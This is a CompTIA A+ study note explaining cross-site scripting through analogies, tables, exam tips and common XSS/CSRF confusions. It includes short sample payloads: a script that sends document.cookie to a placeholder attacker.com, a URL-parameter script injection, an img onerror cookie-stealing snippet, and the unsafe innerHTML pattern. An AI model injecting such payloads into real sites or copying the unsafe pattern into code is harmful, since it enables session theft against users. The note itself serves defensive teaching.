---
tags: [knowledge, aplus, core-2-(220-1202)]
created: 2026-04-30
cert: CompTIA A+
chapter: 45
source: rewritten
---

# Cross-site Scripting
**A web vulnerability where malicious code executes in a victim's browser under the trust of a legitimate website.**

---

## Overview

[[Cross-site Scripting]] (XSS) is a [[web application vulnerability]] where attackers inject malicious [[JavaScript]] or other executable code into web pages that unsuspecting users visit. The attack exploits the trust relationship between a user and a website they've already authenticated to—if you're logged into your bank's website, the site trusts your browser, making it a perfect vector for attackers to steal sensitive data or session tokens. For the A+ exam, understanding XSS is critical because it represents one of the most prevalent [[web security threats]] and demonstrates why input validation and [[output encoding]] are essential defensive practices.

---

## Key Concepts

### Cross-site Scripting (XSS)

**Analogy**: Imagine you're at your trusted bank's physical location. A criminal notices you're a customer and somehow sneaks into the bank, impersonating a staff member. Because the bank trusts you and you trust the bank, you hand over sensitive information to this imposter without questioning their legitimacy. XSS works the same way—the attacker's malicious code runs inside a trusted website where your browser automatically executes it.

**Definition**: A [[web vulnerability]] where an attacker injects executable code (typically [[JavaScript]]) into a web application, causing that code to execute in the [[context]] of a victim's browser session with the privileges and trust level the user has already established with that website.

**Why "XSS" and not "CSS"?** We use XSS instead of CSS because [[CSS]] (Cascading Style Sheets) is already a standard web technology. XSS comes from "Cross-Site Scripting" — originally named because the attack involved malicious scripts crossing from one website domain to another, exploiting browser security gaps that have since been partially mitigated.

---

### Trust Exploitation

**Analogy**: Think of your browser's [[trust relationship]] with a website like a VIP pass. Once you log into your email, the website knows "this is John," and any requests appearing to come from you are accepted without re-verification. An attacker wants to use your VIP pass without you knowing.

**Definition**: XSS attacks leverage the [[implicit trust]] a website places in authenticated user sessions. After you log in, the website trusts requests coming from your browser for a set period, allowing attackers to steal [[session cookies]], credentials, or personal data without additional authentication challenges.

| Trust Element | How XSS Exploits It | Example |
|---|---|---|
| [[Session Cookies]] | Injected script reads and transmits cookies to attacker | `<script>fetch('attacker.com?cookie=' + document.cookie)</script>` |
| [[DOM]] Access | Malicious script accesses page content and user data | Script reads form fields, account numbers, or messages |
| [[Browser Context]] | Script runs with same [[origin]] permissions as the page | Can interact with any resource the user can access |

---

### JavaScript: The Primary Vector

**Analogy**: If a website is a stage, [[JavaScript]] is the puppet master's invisible strings. While the audience (users) only sees the puppet (webpage content), JavaScript silently controls what happens behind the scenes—and attackers can tie malicious strings to those controls.

**Definition**: [[JavaScript]] is the dominant scripting language in modern browsers, and because it's nearly universally enabled (disabling it breaks most modern websites), it's the preferred attack vector for XSS. While other languages ([[VBScript]], [[Flash]]) can theoretically be exploited, [[JavaScript]] dominates the threat landscape because users and developers rarely disable it.

**Why JavaScript is the Problem**:
- Enabled by default in all modern browsers
- Has access to [[DOM]] (Document Object Model), [[cookies]], [[localStorage]]
- Can make [[HTTP]] requests to external servers
- Runs automatically without user confirmation

---

### Injection Mechanisms

**Analogy**: Imagine a restaurant's suggestion box. Normally, customers write legitimate feedback. But a malicious person writes code inside the box that, when the manager reads it aloud, causes everyone to follow a hidden instruction instead of listening to an actual suggestion.

**Definition**: [[Injection mechanisms]] are the pathways attackers use to insert malicious code into a web application. Common vectors include:

| Injection Point | How It Works | Real Example |
|---|---|---|
| [[User Input Fields]] | Attacker types code into forms (comment boxes, search bars) | `<script>alert('hacked')</script>` in a product review |
| [[URL Parameters]] | Malicious code embedded in a link | `https://site.com/search?q=<script>stealData()</script>` |
| [[API Responses]] | Attacker controls data returned from an external service | Compromised third-party widget returns injected code |
| [[DOM-based]] | Attacker exploits how JavaScript processes user-controlled data | `document.body.innerHTML = userInput` (dangerous!) |

---

## Exam Tips

### Question Type 1: Identifying XSS Vulnerabilities
- *"A user clicks a link that loads a webpage. The URL contains JavaScript code that executes in the user's browser. What type of attack is this?"* → **Cross-site Scripting (XSS)** — specifically a [[Reflected XSS]] attack
- *"A web application stores user comments in a database without sanitizing them. When other users view those comments, malicious JavaScript executes. What vulnerability is this?"* → **Stored XSS** — the dangerous variant
- **Trick**: Don't confuse [[CSRF]] (Cross-Site Request Forgery) with XSS. CSRF tricks the website into doing something; XSS tricks the user's browser into executing code. They're cousins but different attacks.

### Question Type 2: Mitigation & Defense
- *"Which of the following best prevents XSS attacks?"* → **Input validation** + **Output encoding** + **Content Security Policy (CSP)**
- **Trick**: "Disabling JavaScript" is technically correct but practically wrong for the exam context—modern websites need JavaScript. The right answer focuses on [[input sanitization]] and [[output encoding]].

### Question Type 3: Real-world Scenarios
- *"An attacker inserts `<img src=x onerror='stealCookie()'>` into a comment field. What type of XSS is this?"* → **Stored XSS** (or **Persistent XSS**)
- **Trick**: If the code runs immediately in the attacker's URL before being stored, it's [[Reflected XSS]]. If it gets saved and runs for every visitor, it's [[Stored XSS]].

---

## Common Mistakes

### Mistake 1: Confusing XSS with CSRF
**Wrong**: "XSS and CSRF are the same thing—both trick users on websites."
**Right**: 
- [[XSS]] = Attacker injects code that executes *in the user's browser*, stealing data or hijacking the session
- [[CSRF]] = Attacker tricks the website into performing unwanted actions *using the user's existing authentication*, without code injection

**Impact on Exam**: You might see a scenario describing malicious JavaScript running in a browser. That's XSS, not CSRF. CSRF involves forged requests without injected code.

---

### Mistake 2: Thinking XSS is Only a Web Developer Problem
**Wrong**: "XSS is a developer issue. IT support doesn't need to know about it for A+ certification."
**Right**: CompTIA A+ includes security concepts that support professionals must understand. You need to recognize XSS vulnerabilities, explain them to users, implement [[content security policies]], and understand why certain security controls matter.

**Impact on Exam**: A+ expects you to identify vulnerable practices (like allowing unrestricted user input on websites) and recommend defensive measures like [[input validation]] and [[output encoding]].

---

### Mistake 3: Assuming All JavaScript Injection is XSS
**Wrong**: "Any time JavaScript appears on a webpage that wasn't supposed to be there, it's XSS."
**Right**: XSS specifically means *injected* code that executes within a user's [[browser context]] after being inserted into a web application. Not every JavaScript reference is XSS—context matters.

**Impact on Exam**: You might see questions about [[DOM manipulation]] or [[event handlers]]. Confirm that the code was *injected* and *executes without authorization* before labeling it XSS.

---

## Related Topics

- [[Web Application Security]]
- [[JavaScript]]
- [[Input Validation]]
- [[Output Encoding]]
- [[Content Security Policy (CSP)]]
- [[Session Cookies]]
- [[CSRF (Cross-Site Request Forgery)]]
- [[SQL Injection]] — similar injection concept, different target
- [[Browser Security]] — [[Same-Origin Policy]]
- [[DOM (Document Object Model)]]

---

*Source: Professor Messer CompTIA A+ Core 2 (220-1202) | [[A+ Core 2 Study Guide]]*